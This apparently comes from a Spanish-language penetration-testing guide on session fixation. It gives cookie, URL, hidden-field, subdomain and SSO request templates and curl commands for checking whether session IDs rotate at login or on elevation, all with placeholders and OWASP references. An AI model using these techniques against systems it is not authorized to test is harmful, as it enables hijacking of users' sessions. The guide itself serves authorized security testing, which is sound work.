# 🗡️ Fijación de sesión: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Identificador antes y después de login

```text
Cookie: session={ID_ANONIMO_PROPIO}
Cookie: session={ID_TRAS_LOGIN_PROPIO}
Cookie: JSESSIONID={ID_ANONIMO_PROPIO}
Cookie: JSESSIONID={ID_TRAS_LOGIN_PROPIO}
```

**Cuándo usarlo:** Capturar los IDs de la misma cuenta de laboratorio antes y después de autenticarse. La igualdad estable sugiere falta de rotación, pero se requiere demostrar que el valor podía fijarse.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).


### Vías de transporte de sesión

```text
Cookie: session={ID_DE_PRUEBA}
GET /cuenta?sessionid={ID_DE_PRUEBA}
GET /cuenta;jsessionid={ID_DE_PRUEBA}
POST /login  sessionid={ID_DE_PRUEBA}
```

**Cuándo usarlo:** Solo probar vías que la aplicación realmente acepta. Una cadena ignorada en URL o cuerpo no constituye fijación.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).


## 🧭 Payloads por contexto

### Transiciones que deben rotar sesión

```text
anonimo -> login -> /api/me
password -> MFA -> /api/me
usuario -> administrador -> /api/me
reset de clave -> nuevo login -> /api/me
```

**Cuándo usarlo:** Registrar el identificador propio en cada transición. La rotación se evalúa donde aumenta el nivel de autenticación o privilegio, con cookies y tokens por separado.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).


### Alcance de cookie

```text
Set-Cookie: session={ID}; Path=/; Secure; HttpOnly
Set-Cookie: session={ID}; Domain={DOMINIO_PADRE}; Path=/
Set-Cookie: session={ID}; Domain={SUBDOMINIO}; Path=/
Set-Cookie: session={ID}; SameSite=Lax
```

**Cuándo usarlo:** Inspeccionar atributos emitidos; no todos son payloads para enviar. El riesgo de fijación por subdominio requiere control legítimo de ese subdominio y aceptación de la cookie por el servidor.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).


## 🔥 Payloads avanzados

### Sesión de dos navegadores propios

```text
Navegador A: cookie={ID_PRE_LOGIN_A} -> iniciar sesión A
Navegador B: cookie={ID_PRE_LOGIN_A} -> abrir /api/me
Navegador A: cookie={ID_POST_LOGIN_A} -> abrir /api/me
Navegador B: cookie={ID_POST_LOGIN_A} -> abrir /api/me
```

**Cuándo usarlo:** Ejecutar solo entre navegadores controlados y limpiar sesiones después. La prueba fuerte demuestra que un ID conocido antes del login queda autenticado y reutilizable.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).


## 🔬 Pruebas guiadas por escenario

### 1. Rotación al iniciar sesión

**Objetivo:** Capturar la cookie anónima y autenticar esa misma sesión propia.

```bash
curl -i -c anon.cookies "https://{ORIGEN}/login"
curl -i -b anon.cookies -c login.cookies -X POST \
  --data-urlencode "username={EMAIL_PROPIO}" \
  --data-urlencode "password={PASSWORD_PROPIA}" \
  "https://{ORIGEN}/login"
```

**Interpretación:** Comparar valores de sesión; si no rotan, todavía falta demostrar que otro navegador puede recibir el ID previo.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/).

### 2. ID anónimo tras login

**Objetivo:** Usar el ID anterior desde una segunda sesión de prueba después del login de A.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Cookie: session={ID_ANONIMO_ANTES_DEL_LOGIN}
```

**Interpretación:** Una respuesta con identidad de A confirma que el ID preconocido se elevó; usar cuentas propias.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/).

### 3. Adopción de ID aportado

**Objetivo:** Enviar un ID sintácticamente válido elegido por el tester antes de autenticarse.

```http
GET /login HTTP/1.1
Host: {ORIGEN}
Cookie: session={ID_ELEGIDO_DE_PRUEBA}
```

**Interpretación:** El servidor debería emitir un ID nuevo. Si conserva el elegido, comprobar su validez después de login.

**Fuente técnica:** [OWASP](https://community.owasp.org/attacks/Session_fixation).

### 4. Session ID en URL

**Objetivo:** Probar si un token de sesión propio en la URL se adopta al autenticarse.

```http
GET /login?sessionid={ID_ANONIMO_PROPIO} HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Solo aplica si la aplicación usa IDs en URL. Verificar que el valor persiste y autoriza después de login.

**Fuente técnica:** [OWASP](https://community.owasp.org/attacks/Session_fixation).

### 5. Campo oculto de sesión

**Objetivo:** Modificar un hidden field de sesión únicamente si el formulario real lo contiene.

```http
POST /login HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

username={EMAIL_PROPIO}&password={PASSWORD_PROPIA}&sessionid={ID_ANONIMO_PROPIO}
```

**Interpretación:** No agregar campos inventados a una app que no los usa. Confirmar en Set-Cookie e identidad efectiva.

**Fuente técnica:** [OWASP](https://community.owasp.org/attacks/Session_fixation).

### 6. Cookie de subdominio

**Objetivo:** Comparar si una cookie Domain amplia de un subdominio propio domina la sesión del host principal.

```http
GET /login HTTP/1.1
Host: {HOST_PRINCIPAL}
Cookie: session={ID_EMITIDO_EN_SUBDOMINIO_PROPIO}
```

**Interpretación:** Se necesita control autorizado del subdominio y cookie Domain compatible; no basta que el navegador envíe dos cookies.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/).

### 7. Rotación en elevación

**Objetivo:** Tras entrar como usuario bajo, ejecutar un paso de elevación propio y comparar IDs.

```http
GET /api/security/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={ID_ANTES_DE_ELEVAR}
```

**Interpretación:** Si una autenticación adicional otorga privilegio, el ID anterior no debería adquirirlos si el diseño exige rotación.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/).

### 8. Matriz ;jsessionid en URL

**Objetivo:** Solo en aplicaciones Java que realmente aceptan URL rewriting, aportar un JSESSIONID anónimo propio en la ruta de login.

```http
GET /login;jsessionid={JSESSIONID_ANONIMO_PROPIO} HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Tras autenticar la misma sesión, comprobar si ese ID previo autoriza desde otro navegador controlado; la mera aceptación de la URL no basta.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/).

### 9. Transición SSO sin rotación

**Objetivo:** Comparar ID de sesión propio antes de iniciar SSO y después del callback autenticado.

```text
Antes de /sso/start: session={ID_ANONIMO_PROPIO}
Después de /sso/callback: session={ID_TRAS_SSO_PROPIO}
Reprobar {ID_ANONIMO_PROPIO} desde segundo perfil propio.
```

**Interpretación:** El identificador preexistente no debería heredar identidad. Documentar si el proveedor o el SP emitió cada cookie.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
